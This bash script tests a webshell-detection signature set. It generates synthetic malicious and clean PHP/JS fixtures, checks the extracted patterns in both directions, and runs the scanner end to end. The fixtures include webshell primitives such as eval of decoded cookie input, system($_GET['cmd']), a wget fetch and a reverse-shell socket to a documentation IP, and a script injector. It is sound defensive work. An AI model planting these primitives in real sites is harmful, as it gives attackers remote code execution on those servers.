#!/bin/bash
# =============================================================================
#  test-signatures.sh -- test the webshell signature set in both directions
#
#  CONTRIBUTING.md asks contributors to verify pattern changes against real
#  shell forms *and* against clean code, and until this script existed it
#  offered no way to do it. The corpus behind the numbers quoted in the README
#  lived only as ad-hoc shell commands, which means every pattern PR had to be
#  taken on trust. This makes that instruction executable.
#
#  Two directions, because a signature set fails in two ways and the second one
#  is quieter: a pattern that misses a shell leaves a compromised host looking
#  clean, and a pattern that flags legitimate code trains a responder to skim
#  past the section that matters.
#
#  Two layers, because those are not the only ways this can be wrong:
#
#    LAYER 1  the patterns themselves. Extracted from webshell-triage.sh at run
#             time, never copied here -- a test holding its own copy of the
#             thing under test passes forever while the real code rots. Each
#             pattern is also compiled on its own, because a malformed bracket
#             expression makes grep exit 2 with a message, and the scanner runs
#             its greps with stderr suppressed, so a broken pattern looks
#             exactly like a pattern that found nothing.
#
#    LAYER 2  the scanner as it actually runs. Layer 1 can pass completely while
#             the report a responder reads is empty -- that shipped, undetected,
#             from the first commit until someone opened the report file instead
#             of watching the terminal. So this layer plants the same fixtures
#             in a throwaway webroot, runs the real scanner over it, and checks
#             the REPORT FILE names them. It also covers the section 16 checks,
#             whose patterns are written inline and cannot be extracted.
#
#  No malware is stored in this repository. Every fixture below is a minimal
#  synthetic reproduction: it has the property a pattern looks for and is not a
#  working shell. They are generated into a temp directory and removed on exit,
#  so a clone of this repository never carries malware-shaped files that
#  endpoint antivirus would quarantine.
#
#  Layer 1 runs anywhere with GNU grep. Layer 2 runs the scanner, which needs
#  Linux and GNU coreutils -- on macOS or under MSYS/Cygwin it either fails on
#  `stat -c` or walks a Windows filesystem for a very long time, so this script
#  declines to run it there rather than reporting a platform problem as a defect
#  in the patterns. On a workstation, use --patterns-only.
#
#  Usage:  bash tools/test-signatures.sh [--patterns-only] [-v]
#    --patterns-only   layer 1 only; does not execute the scanner
#    -v, --verbose     show which pattern matched which fixture
#
#    exit 0  PASS          every fixture behaved as declared
#    exit 1  FAIL          a missed shell form, a flagged clean sample, or a
#                          pattern that does not compile
#    exit 2  INCONCLUSIVE  the patterns could not be extracted, or the scanner
#                          could not be exercised here; layer 2 proved nothing
#
#  IR_TEST_TIMEOUT   seconds to allow the scanner in layer 2 (default 900)
# =============================================================================

set -u

RUN_SCANNER=1
VERBOSE=0
while [ $# -gt 0 ]; do
  case "$1" in
    --patterns-only) RUN_SCANNER=0; shift ;;
    -v|--verbose)    VERBOSE=1; shift ;;
    -h|--help)       sed -n '2,50p' "$0"; exit 0 ;;
    *) echo "unknown arg: $1"; exit 2 ;;
  esac
done

HERE=$(cd "$(dirname "$0")/.." && pwd)
SCANNER="$HERE/webshell-triage.sh"
[ -f "$SCANNER" ] || { echo "INCONCLUSIVE -- cannot find $SCANNER"; exit 2; }

LAB=$(mktemp -d) || { echo "INCONCLUSIVE -- mktemp failed"; exit 2; }
# INT/TERM/HUP as well as EXIT: a shell killed by an untrapped signal exits
# without running its EXIT trap, and this script creates a directory full of
# deliberately malware-shaped files that must not survive an interrupted run.
trap 'rm -rf "$LAB"' EXIT INT TERM HUP

# The fixtures live inside a webroot-shaped tree so that layer 2 can point the
# scanner at it with --root. Layer 1 reads the same files directly.
W="$LAB/tree/home/u1/domains/example.test/public_html"
MALDIR="$W/sigtest/mal"
CLEANDIR="$W/sigtest/clean"
mkdir -p "$MALDIR" "$CLEANDIR" || { echo "INCONCLUSIVE -- cannot build lab"; exit 2; }

FAIL=0
INCONCLUSIVE=0
L2_RAN=0                       # layer 2 reached a verdict rather than being skipped
NR6=0; NR16=0; NRFP=0

# -----------------------------------------------------------------------------
#  Extract the pattern set from the scanner -- one source of truth
# -----------------------------------------------------------------------------
SIGFILE="$LAB/sig.txt"
sed -n '/^cat > "\$SIG" <<.PATTERNS.$/,/^PATTERNS$/p' "$SCANNER" \
  | sed '1d;$d' | grep -v '^[[:space:]]*$' > "$SIGFILE"

PAT=()
while IFS= read -r line; do
  PAT+=("$line")
done < "$SIGFILE"
NPAT=${#PAT[@]}

if [ "$NPAT" -eq 0 ]; then
  echo "INCONCLUSIVE -- extracted 0 patterns from $SCANNER."
  echo "  The heredoc this script reads is expected to look exactly like:"
  echo '      cat > "$SIG" <<'"'"'PATTERNS'"'"
  echo "  If section 6 was restructured, update the sed address above and the"
  echo "  matching instructions in CONTRIBUTING.md together."
  exit 2
fi

echo "signature set: $NPAT patterns extracted from webshell-triage.sh"
echo

# -----------------------------------------------------------------------------
#  Fixtures
#
#  mal6   must be matched by the section 6 pattern set
#  mal16  not a section 6 shape at all; the section 16 checks own these, so only
#         layer 2 can judge them
#  clean  legitimate code that must NOT be matched -- chosen to be the
#         constructs a naive pattern trips on, not arbitrary safe code
# -----------------------------------------------------------------------------
M6_NAME=();  M6_PATH=()
M16_NAME=(); M16_PATH=()
CL_NAME=();  CL_PATH=()

mal6()  { local f="$MALDIR/$1";   cat > "$f"; M6_NAME+=("$1");  M6_PATH+=("$f"); }
mal16() { local f="$MALDIR/$1";   cat > "$f"; M16_NAME+=("$1"); M16_PATH+=("$f"); }
clean() { local f="$CLEANDIR/$1"; cat > "$f"; CL_NAME+=("$1");  CL_PATH+=("$f"); }

# --- must be detected --------------------------------------------------------

mal6 'eval-of-decoder.php' <<'EOF'
<?php
$blob = $_COOKIE['k'];
eval(base64_decode($blob));
EOF

mal6 'assert-on-superglobal.php' <<'EOF'
<?php
assert($_REQUEST['cmd']);
EOF

mal6 'callback-from-superglobal.php' <<'EOF'
<?php
call_user_func($_POST['f'], 'arg');
EOF

mal6 'command-exec-from-superglobal.php' <<'EOF'
<?php
system($_GET['cmd']);
EOF

mal6 'variable-function-call.php' <<'EOF'
<?php
$_POST['fn']($_POST['arg']);
EOF

mal6 'preg-replace-e-modifier.php' <<'EOF'
<?php
preg_replace('/(.*)/e', $_POST['payload'], '');
EOF

mal6 'long-base64-literal.php' <<'EOF'
<?php
$stage = base64_decode('QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODlBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OQ==');
EOF

mal6 'layered-decoders.php' <<'EOF'
<?php
$stage = gzinflate(base64_decode($packed));
EOF

mal6 'superglobal-by-name.php' <<'EOF'
<?php
$in = ${'_REQUEST'}['id'];
EOF

mal6 'globals-indirect-call.php' <<'EOF'
<?php
$GLOBALS['h']('whoami');
EOF

mal6 'chr-built-function-name.php' <<'EOF'
<?php
$f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
EOF

mal6 'known-shell-marker.php' <<'EOF'
<?php
$default_action = 'FilesMan';
EOF

mal6 'download-then-run.php' <<'EOF'
<?php
shell_exec("wget http://192.0.2.10/x -O /tmp/x");
EOF

mal6 'upload-to-attacker-path.php' <<'EOF'
<?php
move_uploaded_file($_FILES['f']['tmp_name'], $_POST['dest']);
EOF

mal6 'eval-of-request-body.php' <<'EOF'
<?php
eval(file_get_contents('php://input'));
EOF

mal6 'reverse-shell-port.php' <<'EOF'
<?php
$sock = fsockopen('192.0.2.10', 4444);
EOF

mal6 'mail-relay.php' <<'EOF'
<?php
mail($_POST['to'], $_POST['subj'], $_POST['body']);
EOF

mal6 'str-replace-then-call.php' <<'EOF'
<?php
str_replace('x', '', 'evxal')($_POST['c']);
EOF

mal6 'silence-and-run-forever.php' <<'EOF'
<?php
@ini_set('display_errors', 0); @set_time_limit(0);
EOF

# --- section 16 shapes: no PHP shell keyword appears at all ------------------
# These are why section 16 exists. The payload is client-side, so every one of
# the patterns above is looking in the wrong language.

mal16 'xor-script-injector.php' <<'EOF'
<?php ?>
<script>
var _k = atob("a2V5"), _d = atob("ZGF0YQ=="), _s = "";
for (var _i = 0; _i < _d.length; _i++) {
  _s += String.fromCharCode(_d.charCodeAt(_i) ^ _k.charCodeAt(_i % 4));
}
var _el = document.createElement("script");
_el.textContent = _s;
document.documentElement.appendChild(_el);
</script>
EOF

mal16 'builtin-name-obfuscation.js' <<'EOF'
var _a = RegExp.name[0] + Array.name[1] + Boolean.name[2];
EOF

# --- must NOT be detected ----------------------------------------------------
# Every one of these is a construct that a slightly greedier pattern would flag.

clean 'compiled-template-eval.php' <<'EOF'
<?php
// A template engine evaluating its own compiled output: eval, but no input.
eval($compiled_template);
EOF

clean 'wp-sanitize-post.php' <<'EOF'
<?php
$name = sanitize_text_field( wp_unslash( $_POST['name'] ) );
EOF

clean 'wp-array-map-post.php' <<'EOF'
<?php
$clean = array_map( 'sanitize_text_field', wp_unslash( $_POST ) );
EOF

clean 'slug-preg-replace.php' <<'EOF'
<?php
$slug = preg_replace( '/[^a-z0-9-]/', '', strtolower( $title ) );
EOF

clean 'chr-line-ending.php' <<'EOF'
<?php
$eol = chr(13) . chr(10);
EOF

clean 'wp-globals-query.php' <<'EOF'
<?php
$posts = $GLOBALS['wp_query']->posts;
EOF

clean 'wp-mail-send.php' <<'EOF'
<?php
wp_mail( $to, $subject, $message );
EOF

clean 'template-str-replace.php' <<'EOF'
<?php
echo str_replace( '%name%', $name, $template );
EOF

clean 'import-script-prelude.php' <<'EOF'
<?php
// The same two calls a bulk importer makes -- on separate lines, which is what
// separates a long-running admin job from a shell settling in.
ini_set( 'display_errors', 0 );
set_time_limit( 300 );
EOF

clean 'smtp-socket.php' <<'EOF'
<?php
$fp = fsockopen( 'mail.example.com', 587, $errno, $errstr, 10 );
EOF

clean 'upload-handler.php' <<'EOF'
<?php
move_uploaded_file( $_FILES['file']['tmp_name'], $upload_dir . '/' . $safe_name );
EOF

clean 'rest-json-body.php' <<'EOF'
<?php
$payload = json_decode( file_get_contents( 'php://input' ), true );
EOF

clean 'deploy-git-revision.php' <<'EOF'
<?php
$rev = shell_exec( '/usr/bin/git rev-parse HEAD' );
EOF

clean 'inline-icon-data-uri.php' <<'EOF'
<?php
// A legitimately embedded asset: a long base64 run that is never decoded by
// PHP. Section 17 measures runs like this by length; section 6 must not.
$icon = 'data:image/png;base64,QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODlBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OQ==';
EOF

clean 'callback-dispatch.php' <<'EOF'
<?php
$value = call_user_func( $callback, $args );
EOF

clean 'jquery-domeval.js' <<'EOF'
function DOMEval( code, node, doc ) {
	doc = doc || document;
	var script = doc.createElement( "script" );
	script.text = code;
	doc.head.appendChild( script ).parentNode.removeChild( script );
}
EOF

NM6=${#M6_NAME[@]}
NM16=${#M16_NAME[@]}
NCL=${#CL_NAME[@]}

# -----------------------------------------------------------------------------
#  LAYER 1a -- every pattern must compile
#
#  This is not defensive padding. A bracket expression containing '[.' opens a
#  POSIX collating symbol; grep exits 2 with "Unmatched [", and since the
#  scanner suppresses stderr, the section prints nothing and reads as clean.
#  That shipped once already.
# -----------------------------------------------------------------------------
echo "-- pattern compilation --"
NBROKEN=0
i=0
for p in "${PAT[@]}"; do
  i=$((i+1))
  printf 'compile probe\n' | grep -qE -e "$p" >/dev/null 2>"$LAB/greperr"
  if [ "$?" -ge 2 ]; then
    NBROKEN=$((NBROKEN+1))
    FAIL=1
    echo "  BROKEN  pattern $i: $(head -n 1 "$LAB/greperr")"
    echo "          $p"
  fi
done
if [ "$NBROKEN" -eq 0 ]; then
  echo "  all $NPAT patterns compile"
fi
echo

# -----------------------------------------------------------------------------
#  LAYER 1b -- detection: every malicious fixture must match the set
# -----------------------------------------------------------------------------
echo "-- detection (must match) --"
COVER=()
i=0
while [ "$i" -lt "$NPAT" ]; do COVER+=(0); i=$((i+1)); done

NDET=0
i=0
while [ "$i" -lt "$NM6" ]; do
  f="${M6_PATH[$i]}"; n="${M6_NAME[$i]}"
  hits=""
  j=0
  while [ "$j" -lt "$NPAT" ]; do
    if grep -qE -e "${PAT[$j]}" "$f" 2>/dev/null; then
      hits="$hits $((j+1))"
      COVER[$j]=$(( ${COVER[$j]} + 1 ))
    fi
    j=$((j+1))
  done
  if [ -n "$hits" ]; then
    NDET=$((NDET+1))
    [ "$VERBOSE" = "1" ] && echo "  ok      $n  (pattern$hits )"
  else
    FAIL=1
    echo "  MISSED  $n"
    echo "          no pattern in the set matches this file:"
    sed 's/^/            /' "$f"
  fi
  i=$((i+1))
done
echo "  detected $NDET/$NM6"
echo

# -----------------------------------------------------------------------------
#  LAYER 1c -- false positives: no clean fixture may match
#
#  Reported per pattern rather than per file, because the actionable unit of a
#  false positive is the pattern that has to change.
# -----------------------------------------------------------------------------
echo "-- false positives (must not match) --"
NFP=0
i=0
while [ "$i" -lt "$NCL" ]; do
  f="${CL_PATH[$i]}"; n="${CL_NAME[$i]}"
  flagged=0
  j=0
  while [ "$j" -lt "$NPAT" ]; do
    if grep -qE -e "${PAT[$j]}" "$f" 2>/dev/null; then
      if [ "$flagged" = "0" ]; then
        NFP=$((NFP+1)); FAIL=1
        echo "  FLAGGED $n -- legitimate code matched by:"
      fi
      flagged=1
      echo "          pattern $((j+1)): ${PAT[$j]}"
      grep -nE -e "${PAT[$j]}" "$f" 2>/dev/null | head -2 | sed 's/^/            line /'
    fi
    j=$((j+1))
  done
  [ "$flagged" = "0" ] && [ "$VERBOSE" = "1" ] && echo "  ok      $n"
  i=$((i+1))
done
echo "  false positives $NFP/$NCL"
echo

# -----------------------------------------------------------------------------
#  LAYER 1d -- coverage: a pattern no fixture exercises is untested
#
#  A warning, not a failure. Adding a pattern for a family you have just seen in
#  the field is legitimate and should not be blocked by this script; it should
#  be followed by a fixture, and this is the reminder.
# -----------------------------------------------------------------------------
NUNCOVERED=0
j=0
while [ "$j" -lt "$NPAT" ]; do
  if [ "${COVER[$j]}" = "0" ]; then
    if [ "$NUNCOVERED" = "0" ]; then
      echo "-- coverage --"
      echo "  WARNING: patterns no fixture exercises. Nothing here is proven to"
      echo "  work; add a minimal synthetic reproduction to this script."
    fi
    NUNCOVERED=$((NUNCOVERED+1))
    echo "          pattern $((j+1)): ${PAT[$j]}"
  fi
  j=$((j+1))
done
if [ "$NUNCOVERED" -gt 0 ]; then echo; fi

# The scanner scans /tmp as well as the webroots, and this file holds the whole
# pattern set -- so it matches the signature scan on every line, exactly the way
# the scanner's own working files used to. Layer 1 is done with it; remove it
# before layer 2 rather than teach layer 2 to ignore it.
rm -f "$SIGFILE"

# -----------------------------------------------------------------------------
#  LAYER 2 -- the scanner as it actually runs, judged by the report file
# -----------------------------------------------------------------------------
KERNEL=$(uname -s 2>/dev/null || echo unknown)
case "$KERNEL" in
  Linux) ;;
  *) if [ "$RUN_SCANNER" = "1" ]; then
       RUN_SCANNER=2          # not attempted, and already explained below
       INCONCLUSIVE=1
       echo "-- end to end: not attempted on $KERNEL --"
       echo "  The scanner targets Linux with GNU coreutils. Running it here"
       echo "  would measure the platform, not the toolkit. Layer 1 above is"
       echo "  unaffected; re-run with --patterns-only for a clean verdict on"
       echo "  the patterns alone, or run this whole script on the server."
       echo
     fi ;;
esac

if [ "$RUN_SCANNER" = "1" ]; then
  echo "-- end to end: does the REPORT name these files? --"
  REPORT="$LAB/report.txt"
  # A hang is a real outcome here -- an unbounded read of a large host is how
  # this check would otherwise fail, silently, at 3am. Bound it and say so.
  SCAN_TIMEOUT=${IR_TEST_TIMEOUT:-900}
  if command -v timeout >/dev/null 2>&1; then
    timeout "$SCAN_TIMEOUT" bash "$SCANNER" --root "$W" --days 400 \
      --out "$REPORT" --no-nice >"$LAB/scan.out" 2>&1
  else
    bash "$SCANNER" --root "$W" --days 400 --out "$REPORT" --no-nice \
      >"$LAB/scan.out" 2>&1
  fi
  SRC=$?
  echo "  scanner exit: $SRC   sections in report: $(grep -c '^## ' "$REPORT" 2>/dev/null || echo 0)"
  if [ "$SRC" = "124" ]; then
    echo "  the scanner did not finish within ${SCAN_TIMEOUT}s and was stopped;"
    echo "  raise IR_TEST_TIMEOUT if this host is genuinely that large."
  fi

  # Everything between a section header and the next one.
  block() {
    awk -v want="## $1" '
      index($0, want) == 1 { inb = 1; next }
      /^## / { inb = 0 }
      inb { print }
    ' "$REPORT" 2>/dev/null
  }

  S6=$(block "6.")
  S16=$(block "16.")

  if [ ! -s "$REPORT" ] || [ -z "$S6" ]; then
    INCONCLUSIVE=1
    echo "  INCONCLUSIVE -- the scanner produced no section 6 in the report."
    echo "  It could not run here rather than running and finding nothing."
    echo "  Last lines of its output:"
    tail -n 5 "$LAB/scan.out" 2>/dev/null | sed 's/^/    /'
  else
    in_block() { printf '%s\n' "$2" | grep -qF -- "$1"; }
    L2_RAN=1

    i=0
    while [ "$i" -lt "$NM6" ]; do
      if in_block "${M6_PATH[$i]}" "$S6"; then
        NR6=$((NR6+1))
      else
        FAIL=1
        echo "  ABSENT  ${M6_NAME[$i]} -- matched by the patterns, missing from section 6"
      fi
      i=$((i+1))
    done

    i=0
    while [ "$i" -lt "$NM16" ]; do
      if in_block "${M16_PATH[$i]}" "$S16"; then
        NR16=$((NR16+1))
      else
        FAIL=1
        echo "  ABSENT  ${M16_NAME[$i]} -- section 16 did not report this file"
      fi
      i=$((i+1))
    done

    i=0
    while [ "$i" -lt "$NCL" ]; do
      if in_block "${CL_PATH[$i]}" "$S6" || in_block "${CL_PATH[$i]}" "$S16"; then
        NRFP=$((NRFP+1)); FAIL=1
        echo "  FLAGGED ${CL_NAME[$i]} -- clean file named in section 6 or 16"
      fi
      i=$((i+1))
    done

    echo "  section 6 reported $NR6/$NM6   section 16 reported $NR16/$NM16   clean files named: $NRFP"

    if [ "$NR6" = "0" ] && [ "$NDET" -gt 0 ]; then
      echo
      echo "  READ THIS: the patterns matched these files when tested directly,"
      echo "  and the report names none of them. That is not a detection gap --"
      echo "  it means the section runs and its output never reaches the report."
      echo "  A responder reading the report sees a clean host. Check that every"
      echo "  line in section 6 goes through log() or cap(), not bare echo."
    fi
  fi
  echo
elif [ "$RUN_SCANNER" = "0" ]; then
  echo "-- end to end: skipped (--patterns-only) --"
  echo
fi

# -----------------------------------------------------------------------------
#  Verdict
# -----------------------------------------------------------------------------
if [ "$FAIL" = "1" ]; then
  echo "FAIL"
  echo "  patterns: detected $NDET/$NM6, false positives $NFP/$NCL, broken $NBROKEN"
  [ "$L2_RAN" = "1" ] && \
  echo "  report:   section 6 named $NR6/$NM6, section 16 named $NR16/$NM16, clean files named $NRFP"
  echo "  A pattern that adds one detection and two false positives is a regression."
  echo "  State both numbers in the pull request."
  exit 1
elif [ "$INCONCLUSIVE" = "1" ]; then
  echo "INCONCLUSIVE -- the pattern set passed ($NDET/$NM6 detected, $NFP/$NCL"
  echo "        false positives), but the scanner could not be exercised here,"
  echo "        so nothing was proven about the report it writes. Re-run on a"
  echo "        Linux host, or use --patterns-only to assert layer 1 alone."
  exit 2
else
  echo "PASS -- $NDET/$NM6 shell forms detected, $NFP/$NCL clean samples flagged,"
  echo "        all $NPAT patterns compile."
  [ "$L2_RAN" = "1" ] && \
  echo "        The report file named all $NR6 section 6 and $NR16 section 16 findings."
  [ "$NUNCOVERED" -gt 0 ] && echo "        $NUNCOVERED pattern(s) have no fixture -- see the warning above."
  exit 0
fi
